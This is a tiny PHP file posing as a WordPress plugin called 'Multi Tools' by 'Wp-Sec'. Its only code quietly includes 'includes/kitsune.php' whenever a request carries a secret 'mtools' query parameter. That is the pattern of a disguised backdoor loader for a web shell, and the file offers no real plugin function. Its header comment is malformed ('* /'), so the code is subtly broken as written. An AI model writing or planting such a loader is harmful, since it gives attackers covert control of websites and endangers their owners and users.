<?php
/**
 
* Plugin Name: Multi Tools 
* Version: 2.1.1
 
* Author: Wp-Sec * /



if(isset($_GET["mtools"])){
	include("includes/kitsune.php");
}

?>
